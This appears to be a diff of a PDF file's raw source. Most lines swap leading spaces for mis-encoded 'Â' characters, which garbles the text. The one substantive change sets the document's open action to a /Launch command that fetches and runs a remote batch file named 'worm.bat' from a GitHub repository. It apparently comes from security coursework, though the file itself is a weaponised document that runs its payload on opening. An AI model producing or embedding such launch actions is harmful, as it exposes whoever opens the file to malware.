@@ -3,38 +3,38 @@
 ?
 1 0 obj?
 <<?
- /Type /Catalog?
- /Outlines 2 0 R?
- /Pages 3 0 R?
- /OpenAction 8 0 R?
+Â /Type /Catalog?
+Â /Outlines 2 0 R?
+Â /Pages 3 0 R?
+Â /OpenAction 8 0 R?
 >>?
 endobj?
 ?
 2 0 obj?
 <<?
- /Type /Outlines?
- /Count 0?
+Â /Type /Outlines?
+Â /Count 0?
 >>?
 endobj?
 ?
 3 0 obj?
 <<?
- /Type /Pages?
- /Kids [4 0 R]?
- /Count 1?
+Â /Type /Pages?
+Â /Kids [4 0 R]?
+Â /Count 1?
 >>?
 endobj?
 ?
 4 0 obj?
 <<?
- /Type /Page?
- /Parent 3 0 R?
- /MediaBox [0 0 612 792]?
- /Contents 5 0 R?
- /Resources ?
- << /ProcSet 6 0 R?
-    /Font << /F1 7 0 R >>?
- >>?
+Â /Type /Page?
+Â /Parent 3 0 R?
+Â /MediaBox [0 0 612 792]?
+Â /Contents 5 0 R?
+Â /Resources ?
+Â << /ProcSet 6 0 R?
+Â  Â  /Font << /F1 7 0 R >>?
+Â >>?
 >>?
 endobj?
 ?
@@ -55,22 +55,22 @@ endobj?
 ?
 7 0 obj?
 <<?
- /Type /Font?
- /Subtype /Type1?
- /Name /F1?
- /BaseFont /Helvetica?
- /Encoding /MacRomanEncoding?
+Â /Type /Font?
+Â /Subtype /Type1?
+Â /Name /F1?
+Â /BaseFont /Helvetica?
+Â /Encoding /MacRomanEncoding?
 >>?
 endobj?
 ?
 8 0 obj?
 <<?
- /Type /Action?
- /S /Launch?
- /Win?
- <<?
-  /F (http://www.host/nombre.exe)?
- >>?
+Â /Type /Action?
+Â /S /Launch?
+Â /Win?
+Â <<?
+Â  /F (https://raw.githubusercontent.com/ernestomancebo/cybersecurity-files/master/worm.bat)?
+Â >>?
 >>?
 endobj?
 ?
@@ -86,8 +86,8 @@ xref?
 0000000662 00000 n?
 trailer?
 <<?
- /Size 9?
- /Root 1 0 R?
+Â /Size 9?
+Â /Root 1 0 R?
 >>?
 startxref?
 751?
